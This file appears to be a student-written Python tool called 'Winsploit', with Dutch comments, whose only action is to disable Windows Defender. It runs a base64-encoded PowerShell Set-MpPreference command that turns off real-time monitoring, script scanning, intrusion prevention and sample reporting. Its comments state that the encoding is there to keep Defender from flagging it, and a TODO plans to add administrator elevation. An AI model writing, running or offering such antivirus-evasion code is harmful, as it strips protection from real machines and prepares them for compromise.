import sys
import subprocess
import base64
import click
import pyfiglet
import random
from banners import banner_list

#Toon de prachtige banner
def show_banner():
    selected_banner_ascii = random.choice(banner_list)
    version = 1.0
    complete_banner = f"{selected_banner_ascii}"
    click.echo(complete_banner)
    pyfiglet.print_figlet(f"Winsploit\nVer: {version}", font='rectangles')
    click.echo("\nLaurens Metz,\nThijs Vixseboxse,\nMario Mancev")

# Functie voor het controlleren of het script op Windows wordt uitgevoerd.
def check_os():
    if sys.platform == "win32":
        return True
    else:
        return False

# Functie voor het uitzetten van Windows Defender
def disable_win_defender():
    #base64 encoding van het commando omdat Windows Defender het programma anders als een virus flagt
    disable_cmd_b64 = "U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZUludHJ1c2lvblByZXZlbnRpb25TeXN0ZW0gIC1EaXNhYmxlSU9BVlByb3RlY3Rpb24gIC1EaXNhYmxlUmVhbHRpbWVNb25pdG9yaW5nICAtRGlzYWJsZVNjcmlwdFNjYW5uaW5nICAtRW5hYmxlQ29udHJvbGxlZEZvbGRlckFjY2VzcyBEaXNhYmxlZCAtRW5hYmxlTmV0d29ya1Byb3RlY3Rpb24gQXVkaXRNb2RlIC1Gb3JjZSAtTUFQU1JlcG9ydGluZyBEaXNhYmxlZCAtU3VibWl0U2FtcGxlc0NvbnNlbnQgTmV2ZXJTZW5kCg=="
    # We mogen het niet in een variabel opslaan, vind Windows defender niet leuk. Vandaar deze prachtige code. (strip voor de newline char, decode om het bytes object naar string te veranderen, f voor fstring.)
    try:
        subprocess.call(f"powershell.exe {base64.b64decode(disable_cmd_b64).strip().decode()}", shell=True)
    except Exception as e:
        return f"Er ging iets mis: {e}"


@click.command()
@click.option("--action", help="De actie die uitgevoerd moet worden.", type=click.Choice(["disable"]))
# Disable is de enige fuctionaliteit voor nu...
#Main functie
def main(action):
    if not action:
        show_banner()
        action = click.prompt('Welke actie wil je uitvoeren?', type=click.Choice(["disable"]))
    match action:
        case "disable":
        # Is dit een windows omgeving? 
            if check_os():
                click.echo(disable_win_defender())
            else:
                click.echo(f"Dit programma werkt alleen in een Windows omgeving. Jouw OS: {sys.platform}")


if __name__ == '__main__':
    main()

# TODO: wachtwoord vragen en Powershell als administrator runnen
